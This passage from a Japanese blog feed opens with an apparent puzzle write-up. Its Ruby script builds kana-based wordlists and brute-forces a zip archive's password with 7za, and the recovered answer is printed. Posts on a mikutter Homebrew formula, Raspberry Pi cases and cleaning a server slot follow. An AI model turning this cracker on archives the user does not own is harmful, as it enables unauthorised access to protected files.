</span><span class='line'><span class="n">consonant3</span> <span class="o">=</span> <span class="o">[</span><span class="s1">&#39;y&#39;</span><span class="p">,</span> <span class="s1">&#39;ky&#39;</span><span class="p">,</span> <span class="s1">&#39;sy&#39;</span><span class="p">,</span> <span class="s1">&#39;ts&#39;</span><span class="p">,</span> <span class="s1">&#39;ny&#39;</span><span class="p">,</span> <span class="s1">&#39;hy&#39;</span><span class="p">,</span> <span class="s1">&#39;by&#39;</span><span class="p">,</span> <span class="s1">&#39;gy&#39;</span><span class="p">,</span> <span class="s1">&#39;py&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="o">]</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="c1"># kana list</span>
</span><span class='line'><span class="n">list</span> <span class="o">=</span> <span class="o">[</span><span class="s1">&#39;&#39;</span><span class="o">]</span>
</span><span class='line'>
</span><span class='line'><span class="k">for</span> <span class="n">v</span> <span class="k">in</span> <span class="n">vowel5</span> <span class="k">do</span>
</span><span class='line'>  <span class="n">list</span><span class="o">.</span><span class="n">push</span> <span class="n">v</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="k">for</span> <span class="n">c</span> <span class="k">in</span> <span class="n">consonant5</span> <span class="k">do</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">v</span> <span class="k">in</span> <span class="n">vowel5</span> <span class="k">do</span>
</span><span class='line'>      <span class="n">list</span><span class="o">.</span><span class="n">push</span> <span class="n">c</span> <span class="o">+</span> <span class="n">v</span>
</span><span class='line'>      <span class="n">list</span><span class="o">.</span><span class="n">push</span> <span class="n">c</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">+</span> <span class="n">c</span> <span class="o">+</span> <span class="n">v</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="k">for</span> <span class="n">c</span> <span class="k">in</span> <span class="n">consonant3</span> <span class="k">do</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">v</span> <span class="k">in</span> <span class="n">vowel3</span> <span class="k">do</span>
</span><span class='line'>      <span class="n">list</span><span class="o">.</span><span class="n">push</span> <span class="n">c</span> <span class="o">+</span> <span class="n">v</span>
</span><span class='line'>      <span class="n">list</span><span class="o">.</span><span class="n">push</span> <span class="n">c</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">+</span> <span class="n">c</span> <span class="o">+</span> <span class="n">v</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="n">list</span><span class="o">.</span><span class="n">push</span> <span class="s1">&#39;nn&#39;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="n">locker</span> <span class="o">=</span> <span class="no">Mutex</span><span class="o">::</span><span class="kp">new</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># Wordlist generator</span>
</span><span class='line'><span class="n">queue</span> <span class="o">=</span> <span class="o">[]</span>
</span><span class='line'><span class="no">Thread</span><span class="o">.</span><span class="n">start</span> <span class="p">{</span>
</span><span class='line'>  <span class="n">q</span> <span class="o">=</span> <span class="o">[</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="o">]</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">p0</span> <span class="k">in</span> <span class="n">list</span> <span class="k">do</span>
</span><span class='line'>      <span class="k">for</span> <span class="n">p1</span> <span class="k">in</span> <span class="n">list</span> <span class="k">do</span>
</span><span class='line'>          <span class="k">for</span> <span class="n">p2</span> <span class="k">in</span> <span class="n">list</span> <span class="k">do</span>
</span><span class='line'>              <span class="k">for</span> <span class="n">p3</span> <span class="k">in</span> <span class="n">list</span> <span class="k">do</span>
</span><span class='line'>                  <span class="k">for</span> <span class="n">p4</span> <span class="k">in</span> <span class="n">list</span> <span class="k">do</span>
</span><span class='line'>                      <span class="k">for</span> <span class="n">p5</span> <span class="k">in</span> <span class="n">list</span> <span class="k">do</span>
</span><span class='line'>                          <span class="n">q</span><span class="o">[</span><span class="mi">5</span><span class="o">]</span> <span class="o">=</span> <span class="n">p5</span>
</span><span class='line'>                          <span class="n">qq</span> <span class="o">=</span> <span class="n">q</span><span class="o">.</span><span class="n">join</span>
</span><span class='line'>                          <span class="k">unless</span> <span class="n">qq</span> <span class="o">=~</span> <span class="sr">/^(.)\1/</span> <span class="k">then</span>
</span><span class='line'>                              <span class="n">locker</span><span class="o">.</span><span class="n">synchronize</span> <span class="p">{</span> <span class="n">queue</span><span class="o">.</span><span class="n">push</span> <span class="n">qq</span> <span class="p">}</span>
</span><span class='line'>                          <span class="k">end</span>
</span><span class='line'>                      <span class="k">end</span>
</span><span class='line'>                      <span class="n">q</span><span class="o">[</span><span class="mi">4</span><span class="o">]</span> <span class="o">=</span> <span class="n">p4</span>
</span><span class='line'>                  <span class="k">end</span>
</span><span class='line'>                  <span class="n">q</span><span class="o">[</span><span class="mi">3</span><span class="o">]</span> <span class="o">=</span> <span class="n">p3</span>
</span><span class='line'>              <span class="k">end</span>
</span><span class='line'>              <span class="n">q</span><span class="o">[</span><span class="mi">2</span><span class="o">]</span> <span class="o">=</span> <span class="n">p2</span>
</span><span class='line'>          <span class="k">end</span>
</span><span class='line'>          <span class="n">q</span><span class="o">[</span><span class="mi">1</span><span class="o">]</span> <span class="o">=</span> <span class="n">p1</span>
</span><span class='line'>      <span class="k">end</span>
</span><span class='line'>      <span class="n">q</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">=</span> <span class="n">p0</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="c1"># Password cracker</span>
</span><span class='line'><span class="nb">puts</span> <span class="s1">&#39;Cracking...&#39;</span>
</span><span class='line'><span class="n">thread_count</span> <span class="o">=</span> <span class="mi">128</span>
</span><span class='line'><span class="n">threads</span> <span class="o">=</span> <span class="o">[]</span>
</span><span class='line'><span class="n">found</span> <span class="o">=</span> <span class="kp">false</span>
</span><span class='line'><span class="n">thread_count</span><span class="o">.</span><span class="n">times</span> <span class="k">do</span> <span class="o">|</span><span class="n">i</span><span class="o">|</span>
</span><span class='line'>  <span class="n">threads</span> <span class="o">&lt;&lt;</span> <span class="no">Thread</span><span class="o">.</span><span class="n">start</span> <span class="p">{</span>
</span><span class='line'>      <span class="kp">loop</span> <span class="k">do</span>
</span><span class='line'>          <span class="k">break</span> <span class="k">if</span> <span class="n">found</span>
</span><span class='line'>          <span class="k">break</span> <span class="k">unless</span> <span class="n">queue</span>
</span><span class='line'>          <span class="n">pass</span> <span class="o">=</span> <span class="n">locker</span><span class="o">.</span><span class="n">synchronize</span> <span class="p">{</span> <span class="n">queue</span><span class="o">.</span><span class="n">shift</span> <span class="p">}</span> <span class="o">+</span> <span class="s2">&quot;misaki&quot;</span>
</span><span class='line'>          <span class="n">t</span> <span class="o">=</span> <span class="nb">system</span> <span class="s2">&quot;7za x -p</span><span class="si">#{</span><span class="n">pass</span><span class="si">}</span><span class="s2"> -so mondai5.zip &gt; /dev/null 2&gt; /dev/null&quot;</span>
</span><span class='line'>          <span class="k">if</span> <span class="n">t</span> <span class="k">then</span>
</span><span class='line'>              <span class="n">found</span> <span class="o">=</span> <span class="kp">true</span>
</span><span class='line'>              <span class="nb">puts</span> <span class="s1">&#39;## PASS FOUND ##&#39;</span>
</span><span class='line'>              <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;pass.txt&quot;</span><span class="p">,</span> <span class="s2">&quot;a&quot;</span><span class="p">)</span> <span class="p">{</span><span class="o">|</span><span class="n">f</span><span class="o">|</span> <span class="n">f</span><span class="o">.</span><span class="n">puts</span> <span class="n">pass</span> <span class="p">}</span>
</span><span class='line'>              <span class="nb">puts</span> <span class="s1">&#39;pass saved.&#39;</span>
</span><span class='line'>          <span class="k">end</span>
</span><span class='line'>      <span class="k">end</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="n">threads</span><span class="o">.</span><span class="n">each</span> <span class="p">{</span> <span class="o">|</span><span class="n">th</span><span class="o">|</span> <span class="n">th</span><span class="o">.</span><span class="n">join</span> <span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>1時間ほどお風呂に入って放置していたら、答えが吐き出されていました。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span><span class="nb">time</span> ./solver.rb
</span><span class='line'>Cracking...
</span><span class='line'><span class="c">## PASS FOUND ##</span>
</span><span class='line'>pass saved.
</span><span class='line'>
</span><span class='line'>real    16m44.573s
</span><span class='line'>user    30m36.171s
</span><span class='line'>sys     18m7.269s
</span></code></pre></td></tr></table></div></figure>


<p>潮岬（読み：しおのみさき）の「潮」の字を「うしお」と読み違えて（？）パスワードに設定していたようです。</p>

<p>このパスワードを入力することでmondai5.zipを展開することができました。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>7z x mondai5.zip
</span><span class='line'>
</span><span class='line'>7-Zip <span class="o">[</span>64<span class="o">]</span> 9.20  Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2010 Igor Pavlov  2010-11-18
</span><span class='line'>p7zip Version 9.20 <span class="o">(</span><span class="nv">locale</span><span class="o">=</span>utf8,Utf16<span class="o">=</span>on,HugeFiles<span class="o">=</span>on,4 CPUs<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Processing archive: mondai5.zip
</span><span class='line'>
</span><span class='line'>Extracting  hint5.txt
</span><span class='line'>Enter password <span class="o">(</span>will not be echoed<span class="o">)</span> :
</span><span class='line'>
</span><span class='line'>Extracting  mondai5
</span><span class='line'>Extracting  mondai6.zip
</span><span class='line'>
</span><span class='line'>Everything is Ok
</span><span class='line'>
</span><span class='line'>Files: 3
</span><span class='line'>Size:       70380412
</span><span class='line'>Compressed: 70378640
</span></code></pre></td></tr></table></div></figure>


<!--

$ 7za x mondai5.zip -pushiomisaki

7-Zip (a) [64] 9.38 beta  Copyright (c) 1999-2014 Igor Pavlov  2015-01-03
p7zip Version 9.38.1 (locale=ja_JP.UTF-8,Utf16=on,HugeFiles=on,4 CPUs)

Processing archive: mondai5.zip

Extracting  hint5.txt
Extracting  mondai5
Extracting  mondai6.zip

Everything is Ok

Files: 3
Size:       70380412
Compressed: 70378640

-->


<p>mondai5以降のWrite-upは明日公開します。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[OS X向けmikutterパッケージ(Homebrew)作ったよ]]></title>
    <link href="http://mzyy94.com/blog/2015/03/13/mikutter-brew-formula/"/>
    <updated>2015-03-13T10:48:00+09:00</updated>
    <id>http://mzyy94.com/blog/2015/03/13/mikutter-brew-formula</id>
    <content type="html"><![CDATA[<p>3月13日ですがミクの日です。</p>

<p>mikutterをご存知ない方はいないと思いますが、簡単に説明すると、日本で一番有名なツイッタークライアントのことです。
このmikutter、Linuxの幾つかのメジャーなディストリビューションにはパッケージが用意されているのですが、
革新的なOSであるOS Xにはパッケージが存在せず、導入する際には各自ちまちまと依存関係をクリアしていかなければいけないのです。</p>

<p>新しいMacBookが発表されて世のOS Xユーザーも0.1‰ほど増えるだろうというこの時期に、mikutterがパッケージ管理されない状態が続いていていいのでしょうか。</p>

<p>そんな自問自答からOS X用パッケージマネージャーの<a href="http://brew.sh/index_ja.html">Homebrew</a>向けにパッケージを作ったのでご報告です。</p>

<!-- more -->


<h1>Brew formulae</h1>

<p>Homebrewでは、パッケージをformulaという形で管理しています。
このformulaは、パッケージの依存関係とソースコードやバイナリの場所、そしてインストール処理を行うスクリプトが書かれているRubyのコードでできています。
新しいパッケージを追加したい場合などはこのformulaを作成し、HomebrewのリポジトリにPull-Requestを行う事で大元のパッケージ群に追加してもらうことができます。
この新しいformulaの作成はbrewコマンドで行うことができます。
詳しくは<a href="https://github.com/Homebrew/homebrew/blob/master/share/doc/homebrew/Formula-Cookbook.md">homebrew/Formula-Cookbook.md at master · Homebrew/homebrew</a>を参考にしてください。</p>

<h1>mikutter formula</h1>

<p><del>
前節のようにしてPull-Requestを行っている状態のBrewパッケージとして、mikutter formulaを作成しました。
mikutterを動作させる上で必要なライブラリ等の依存関係も解決してインストールするようにできています。
</del></p>

<p><del>
<a href="https://github.com/Homebrew/homebrew/pull/37642">mikutter 3.2.2 (new formula) by mzyy94 · Pull Request #37642 · Homebrew/homebrew</a>
</del></p>

<p><del>
このformulaがHomebrewのリポジトリにマージされればコマンド1行打ち込むだけでmikutterのインストールが完了するのですが、
まだマージされていないので2行のコマンドを打つ必要があります。
</del></p>

<p><ins datetime="2015-05-29T19:02:42+09:00">訂正：homebrew側のビルドBotでMountain Lionにてエラーが出るためマージされませんでした。
そのため、mikutterのアップデートに追従できないため、別でリポジトリを作成したのでこちらのFormulaを利用してください。</p>

<ul>
<li><a href="https://github.com/mzyy94/homebrew-mikutter">mzyy94/homebrew-mikutter</a></li>
</ul>


<p>こちらでも2行のコマンドでインストールできます。
</ins></p>

<p>今までは、 tar-ballをダウンロードしてGTK+インストールしてgemインストールして&#8230; と、10行近くコマンドを打ち込まなければいけなかったので2行でも大きな進歩と言えます。</p>

<h1>#mikutterInstallBattle</h1>

<p>皆さん大好き#mikutterInstallBattleの時間です。</p>

<p>まず、最低限必要なものは以下の2つです。</p>

<ul>
<li><a href="http://brew.sh">Homebrew</a></li>
<li><a href="https://xquartz.macosforge.org">Xquartz.app</a></li>
</ul>


<p>パッケージマネージャーのHomebrewとX11アプリケーションのためのX Window SystemであるXquartzを導入しておくだけでいいです。</p>

<p>あとはHomebrewのコマンドを叩くだけ。
<del>
執筆時点(2015/3/13 10:24:33+JST)ではまだPull-Requestはマージされていないので、まずPull-Requestからformulaを引っ張ってきます。
</del></p>

<p><del>
$ brew pull 37642
</del></p>

<p><ins datetime="2015-05-29T19:02:42+09:00">別リポジトリからのtapとして導入するため、以下のコマンドでmikutterのFormulaを取得します。</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ brew tap mzyy94/mikutter</span></code></pre></td></tr></table></div></figure>


<p></ins></p>

<p>無事formulaが取得できたらあとは、</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ brew install mikutter</span></code></pre></td></tr></table></div></figure>


<p>でインストールができます。</p>

<p>そして、</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ mikutter</span></code></pre></td></tr></table></div></figure>


<p>で起動します。
以上です。</p>

<h1>日本語入力</h1>

<p>日本語入力はインストールしたての状態ではできないので各自ぐぐってがんばってください。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[無印良品で買えるRaspberry Pi2にぴったりのケース]]></title>
    <link href="http://mzyy94.com/blog/2015/03/09/muji-raspberry-pi-enclosure/"/>
    <updated>2015-03-09T12:09:04+09:00</updated>
    <id>http://mzyy94.com/blog/2015/03/09/muji-raspberry-pi-enclosure</id>
    <content type="html"><![CDATA[<p>Raspberry Pi2を発売日に2つ注文したものの、ケースを準備していなかったので手軽に買えるRaspberry Piにぴったりの入れ物はないかと
近所のショッピングモールを回ったところ、無印良品に寸法ぴったりのケースがいつくか売られていたので購入してみました。</p>

<!-- more -->


<h1>ポリプロピレンフタ付石けん置き・大</h1>

<p>無印良品ネットストア価格：税込350円</p>

<p><a href="http://www.muji.net/store/cmdty/detail/4548718640850">http://www.muji.net/store/cmdty/detail/4548718640850</a></p>

<ul>
<li>寸法：約７０×１０５×３５ｍｍ</li>
<li>素材：ポリプロピレン</li>
</ul>


<p><img src="http://mzyy94.com/blog/resources/images/2015/03/09/muji-soapcase-1.jpg" alt="muji-soapcase-1" /></p>

<p>1つ目は寸法がRaspberry Piのために作られたかと感じるほどにピッタリサイズの石鹸ケース。本当にピッタリサイズです。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/03/09/muji-soapcase-2.jpg" alt="muji-soapcase-2" /></p>

<p>スポンジ付きで、ケース内に収めた時の安定性・可搬性は抜群です。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/03/09/muji-soapcase-3.jpg" alt="muji-soapcase-3" />
<img src="http://mzyy94.com/blog/resources/images/2015/03/09/muji-soapcase-4.jpg" alt="muji-soapcase-4" /></p>

<p>ただ、エッジが尖っているRaspberry Pi 1 model B（プラスではない）は引っかかってしまい、格納できませんでした。</p>

<h1>ポリプロピレンペンケース（横型）　大</h1>

<p>無印良品ネットストア価格：税込263円</p>

<p><a href="http://www.muji.net/store/cmdty/detail/4547315371297">http://www.muji.net/store/cmdty/detail/4547315371297</a></p>

<ul>
<li>寸法：約１７０×５１×２０ｍｍ</li>
<li>素材：ポリプロピレン</li>
</ul>


<p><img src="http://mzyy94.com/blog/resources/images/2015/03/09/muji-pencase-1.jpg" alt="muji-pencase-1" /></p>

<p>奥行きがRaspberry Piにピッタリで横幅がRaspberry Pi 二台分のケース。2台同時に持ち運んだり格納する際に利用したいケースです。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/03/09/muji-pencase-2.jpg" alt="muji-pencase-2" />
<img src="http://mzyy94.com/blog/resources/images/2015/03/09/muji-pencase-3.jpg" alt="muji-pencase-3" /></p>

<h1>ポリプロピレン救急用品ケース</h1>

<p>無印良品ネットストア価格：税込231円</p>

<p><a href="http://www.muji.net/store/cmdty/detail/4945247506822">http://www.muji.net/store/cmdty/detail/4945247506822</a></p>

<ul>
<li>寸法：約７５×１１０×４６ｍｍ</li>
<li>素材：ポリプロピレン</li>
</ul>


<p><img src="http://mzyy94.com/blog/resources/images/2015/03/09/muji-facase-1.jpg" alt="muji-facase-1" /></p>

<p>奥行き・幅・高さともにゆとりのあるケース。いろいろな部品を装着したRaspberry Piに適しています。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/03/09/muji-facase-2.jpg" alt="muji-facase-2" />
<img src="http://mzyy94.com/blog/resources/images/2015/03/09/muji-facase-3.jpg" alt="muji-facase-3" /></p>

<p>ちなみに石鹸ケースがぴったりおさまります。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/03/09/muji-facase-4.jpg" alt="muji-facase-4" /></p>

<h1>アクリルケース用・ベロア内箱仕切・縦・グレー</h1>

<p>無印良品ネットストア価格：税込600円</p>

<p><a href="http://www.muji.net/store/cmdty/detail/4945247381009">http://www.muji.net/store/cmdty/detail/4945247381009</a></p>

<ul>
<li>寸法：約幅１６×奥行１２×高さ２．５ｃｍ</li>
<li>素材：？？</li>
</ul>


<p><img src="http://mzyy94.com/blog/resources/images/2015/03/09/muji-innercase-1.jpg" alt="muji-innercase-1" /></p>

<p>平置きで2台格納できるケース。蓋がないので可搬性はゼロですがポンと置いておく分には手軽で机の上に一つ置いておくとよい品です。</p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/03/09/muji-innercase-2.jpg" alt="muji-innercase-2" /></p>

<p><img src="http://mzyy94.com/blog/resources/images/2015/03/09/muji-innercase-3.jpg" alt="muji-innercase-3" /></p>

<h1>まとめ</h1>

<table>
<thead>
<tr>
<th style="text-align:center;">商品名</th>
<th style="text-align:center;">サイズ</th>
<th style="text-align:center;">加工</th>
<th style="text-align:center;">可搬性</th>
<th style="text-align:right;">価格</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center;">石けん置き・大</td>
<td style="text-align:center;">ぴったり</td>
<td style="text-align:center;">容易</td>
<td style="text-align:center;">◎スポンジ付き</td>
<td style="text-align:right;">350</td>
</tr>
<tr>
<td style="text-align:center;">ペンケース・大</td>
<td style="text-align:center;">2個分</td>
<td style="text-align:center;">容易</td>
<td style="text-align:center;">○2個で安定</td>
<td style="text-align:right;">263</td>
</tr>
<tr>
<td style="text-align:center;">救急用品ケース</td>
<td style="text-align:center;">余裕あり</td>
<td style="text-align:center;">容易</td>
<td style="text-align:center;">△上下に動く</td>
<td style="text-align:right;">231</td>
</tr>
<tr>
<td style="text-align:center;">ベロア内箱仕切</td>
<td style="text-align:center;">2個分</td>
<td style="text-align:center;">厳しい</td>
<td style="text-align:center;">×蓋なし</td>
<td style="text-align:right;">600</td>
</tr>
</tbody>
</table>


<p>どれも電源やLANケーブル用を接続するには加工が必要となりますが、上3つの素材はポリプロピレンなので加工は意外と簡単です。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[柚子胡椒でサーバーを壊さないために]]></title>
    <link href="http://mzyy94.com/blog/2015/03/06/yuzu-trouble/"/>
    <updated>2015-03-06T18:05:49+09:00</updated>
    <id>http://mzyy94.com/blog/2015/03/06/yuzu-trouble</id>
    <content type="html"><![CDATA[<blockquote class="twitter-tweet" lang="ja"><p>【急募】PCIスロットに詰まった柚子胡椒を取り除く方法</p>&mdash; えびみっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/573719000464556033">2015, 3月 6</a></blockquote>


<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>


<p>柚子胡椒を部屋中にぶちまけたところ、メンテナンス中だったサーバーのマザーボードに降りかかり、あろうことか柚子胡椒がPCIeスロットに入り込んでいました。
すでにそのような経験のある人には不要な記事かもしれませんが、Twitter経由で得られた、柚子胡椒とサーバーをお持ちのみなさまによる解決案と対策をまとめました。</p>

<!-- more -->


<h1>事の経緯</h1>

<blockquote class="twitter-tweet" lang="ja"><p>柚子胡椒のチューブの出が悪い&#10;↓&#10;振って出やすくする&#10;↓&#10;キャップ閉め忘れる&#10;↓&#10;部屋中に柚子胡椒が飛び散る&#10;↓&#10;メンテナンス中のサーバーに降りかかってる&#10;↓&#10;PCIスロットに詰まってる</p>&mdash; えびみっきー (@mzyy94) <a href="https://twitter.com/mzyy94/status/573719406284398592">2015, 3月 6</a></blockquote>


<p>柚子胡椒を出したかっただけなのです。</p>

<p>追記：ここにまとめられているようです。</p>

<p><a href="http://togetter.com/li/791586">柚子胡椒スロット - Togetterまとめ</a></p>

<h1>解決案</h1>

<p>柚子胡椒を取り除く解決案がいくつか寄せられたのでご紹介します。</p>

<h2>吹き付ける</h2>

<blockquote class="twitter-tweet" data-conversation="none" lang="ja"><p><a href="https://twitter.com/mzyy94">@mzyy94</a> ふつうにエアダスターとかでは</p>&mdash; 日替わりデトックス (@polamjag) <a href="https://twitter.com/polamjag/status/573721418392727552">2015, 3月 6</a></blockquote>


<blockquote class="twitter-tweet" data-conversation="none" lang="ja"><p><a href="https://twitter.com/mzyy94">@mzyy94</a> マジレスすると逆さまにして下からブレーキクリーナーを吹いて流すくらいですかねー&#10;ある程度は爪楊枝や紙で取っておくといいでしょう</p>&mdash; タモ＝サーン (@tamosan) <a href="https://twitter.com/tamosan/status/573721435580956672">2015, 3月 6</a></blockquote>


<p>エアダスターは手持ちを切らしていてトライできず。ブレーキクリーナーは持ってなかったので試せなかったのですが、油分の多い調味料がスロットに入った場合は効果的かもしれません。</p>

<h2>吸う</h2>

<blockquote class="twitter-tweet" data-conversation="none" lang="ja"><p><a href="https://twitter.com/mzyy94">@mzyy94</a> 単なる思い付きで確証はないですがハンダ吸い取り器とか使えませんかね</p>&mdash; ゆーいちろー@沈降中 (@Yuichiro_S) <a href="https://twitter.com/Yuichiro_S/status/573721963736096768">2015, 3月 6</a></blockquote>


<blockquote class="twitter-tweet" data-conversation="none" lang="ja"><p><a href="https://twitter.com/mzyy94">@mzyy94</a> 掃除機で吸えば……</p>&mdash; 堀石 廉 (@Holyithylene) <a href="https://twitter.com/Holyithylene/status/573720291160944641">2015, 3月 6</a></blockquote>


<blockquote class="twitter-tweet" data-conversation="none" lang="ja"><p><a href="https://twitter.com/mzyy94">@mzyy94</a> 「急いで口で吸え！」とか自分が知らないネタを言ってみる</p>&mdash; 赤井太一 (@CM_cube) <a href="https://twitter.com/CM_cube/status/573720661647982592">2015, 3月 6</a></blockquote>


<blockquote class="twitter-tweet" data-conversation="none" lang="ja"><p><a href="https://twitter.com/mzyy94">@mzyy94</a> 電源入れてあっためたらとんでも無いことになりそう・・・！　うーん、、掃除機で吸い出して、その後なんとか拭き取るってのもあるけど錆びちゃいそうですよね・・・吹かないと。</p>&mdash; salexkidd (@salexkidd) <a href="https://twitter.com/salexkidd/status/573722031193116673">2015, 3月 6</a></blockquote>


<blockquote class="twitter-tweet" data-conversation="none" lang="ja"><p><a href="https://twitter.com/mzyy94">@mzyy94</a> まず大きな塊はストローで吸い取れませんか</p>&mdash; Koike (@kichi_robo) <a href="https://twitter.com/kichi_robo/status/573721080570888194">2015, 3月 6</a></blockquote>


<!--blockquote class="twitter-tweet" lang="ja"><p>水吸うパーツもあるからなあ。掃除機で吸う→乾かす→エアダスターアンド掃除機でさらに吸う とかでよかった気もする <a href="https://twitter.com/hashtag/%E6%9F%9A%E5%AD%90%E8%83%A1%E6%A4%92?src=hash">#柚子胡椒</a></p>&mdash; \m (@m43net) <a href="https://twitter.com/m43net/status/573743610425815041">2015, 3月 6</a></blockquote-->


<p>一番多かった解決案です。吸引力でなんとかなる調味料もあるかもしれませんが、PCIスロットに潜む柚子胡椒はあの半固体感と適度な粘性によって、半田吸い取り機での吸引は効果ゼロでした。あと手元にある掃除機はルンバだけなので、掃除機チャレンジはできませんでした。</p>

<h2>洗い流す</h2>

<blockquote class="twitter-tweet" data-conversation="none" lang="ja"><p><a href="https://twitter.com/mzyy94">@mzyy94</a> もう、マザーボードはずして水洗いしか。バックアップバッテリーはずすの忘れないように。</p>&mdash; 堀石 廉 (@Holyithylene) <a href="https://twitter.com/Holyithylene/status/573721583505661952">2015, 3月 6</a></blockquote>


<blockquote class="twitter-tweet" data-conversation="none" lang="ja"><p><a href="https://twitter.com/mzyy94">@mzyy94</a> <a href="https://twitter.com/takauke">@takauke</a> 純アルコールに漬け込んでみてはいかがですかね？</p>&mdash; いとー@東京 (@transistor) <a href="https://twitter.com/transistor/status/573723431113334784">2015, 3月 6</a></blockquote>


<blockquote class="twitter-tweet" data-conversation="none" lang="ja"><p><a href="https://twitter.com/mzyy94">@mzyy94</a> 最終手段としては、CMOS電池外す⇒中性洗剤で洗う⇒水道水でよくすすぐ&#10;⇒純水ですすぐ⇒エタノール漬けで脱水⇒よく乾燥させるくらいですかね？</p>&mdash; 桜庭ねむ＠醤油屋L０L1エンジニア (@sakuraba_nemu) <a href="https://twitter.com/sakuraba_nemu/status/573724225879441409">2015, 3月 6</a></blockquote>


<p>今回採用したケースです。塩分と油分の含まれる柚子胡椒には中性洗剤を溶いた純水（純水の定義については後述）が効果的であるという目論見のもと、この解決案を採用しました。乾燥にはアルコール（エタノール）を使用するというのがマザボ水洗い界隈には定石のようです。</p>

<h1>トラブル対処の図</h1>

<blockquote class="twitter-tweet" lang="ja"><p>TLの皆様からの貴重な解決法の提供を受け&#10;・純水使用&#10;・中性洗剤使用&#10;・歯ブラシは危険&#10;・エタノールで水分揮発&#10;を実践してみます。各位貴重な情報ありがとうございます。 <a href="http://t.co/z6TDweZYOL">pic.twitter.com/z6TDweZYOL</a></p>&mdash; PCI柚子胡椒職人 (@mzyy94) <a href="https://twitter.com/mzyy94/status/573728196991918080">2015, 3月 6</a></blockquote>


<h1>注意点</h1>

<h2>純水と精製水は違う</h2>

<blockquote class="twitter-tweet" lang="ja"><p>純水と超純水はちがうっすよ，PCI柚胡椒氏．．．</p>&mdash; じとめすきー (@jitomesky) <a href="https://twitter.com/jitomesky/status/573729225326247936">2015, 3月 6</a></blockquote>


<p>手元にあった純水は、サーバーで飼っていたえびの汽水濃度を調節するものです。また、純水≠精製水であり、電子機器の洗浄に用いられるのは超純水というものであるそうです。慌てふためいていたのですっかり「純水＝純水という名の水」と勘違いしてしまい、純水(精製水ではない)を使ってしまいました。</p>

<blockquote class="twitter-tweet" lang="ja"><p>&gt;&gt; 半導体などの電子部品や電子回路の基板、更には液晶パネルに使うガラスなどの製造工程で使う洗浄水には、ごく微量の不純物が残っていても製品の品質に重大な影響を及ぼすため、純水から純度を更に上げた超純水を用いる必要がある。</p>&mdash; じとめすきー (@jitomesky) <a href="https://twitter.com/jitomesky/status/573728845771071488">2015, 3月 6</a></blockquote>


<p>薬局で「精製水」と記載のあるあるものを利用するのが、一般家庭での基板洗浄には最適だそうです。</p>

<h2>歯ブラシでこする</h2>

